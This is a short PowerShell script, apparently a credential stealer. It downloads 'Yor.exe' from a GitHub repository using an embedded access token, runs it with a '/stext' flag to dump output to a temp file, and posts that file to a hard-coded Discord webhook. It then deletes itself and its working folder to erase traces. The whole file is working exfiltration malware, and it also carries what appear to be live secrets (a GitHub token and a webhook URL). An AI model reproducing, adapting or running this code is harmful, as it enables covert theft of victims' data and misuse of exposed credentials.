$repoOwner = "yorobsession"
$repoName = "YorObsession"
$filePath = "Yor.exe"
$personalAccessToken = "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"

$apiUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/master/$filePath"
$webhookUrl = "https://discord.com/api/webhooks/1195821964212830289/I-I2dZVEr2aoNVq4DlnTYPD4LYyTQk-67RnASO7EI0189E9w9ArIY2WehEAuX34igDRQ"
$folderName = "tempyor"
$filePath = "C:\$folderName\temp.txt"
$exePath = "C:\$folderName\Yor.exe"

$headers = @{
    Authorization = "Bearer $personalAccessToken"
}

# Use Invoke-RestMethod to download the file

$null = New-Item -Path "C:\" -Name $folderName -ItemType "directory"
$null = Invoke-RestMethod -Uri $apiUrl -Headers $headers -OutFile $exePath -Method Get
Start-Sleep -Seconds 2
& $exePath /stext $filePath
Start-Sleep -Seconds 2
$fileContent = Get-Content -Path $filePath -Raw
$boundary = [System.Guid]::NewGuid().ToString()
    
$script = @"
-----------------------------363663446017286492952695560520
Content-Disposition: form-data; name="payload_json"

{"content":null,"embeds":null}
-----------------------------363663446017286492952695560520
Content-Disposition: form-data; name="file[0]"; filename="temp.txt"
Content-Type: text/plain

$fileContent
-----------------------------363663446017286492952695560520--
"@

# Send the updated script to the Discord webhook
$null = Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers @{
    "Accept" = "application/json"
    "Content-Type" = "multipart/form-data; boundary=---------------------------363663446017286492952695560520"
} -Body ([System.Text.Encoding]::UTF8.GetBytes($script))

$currentScriptPath = $MyInvocation.MyCommand.Path

Remove-Item -Path $currentScriptPath -Force
Remove-Item "C:\$folderName" -Recurse
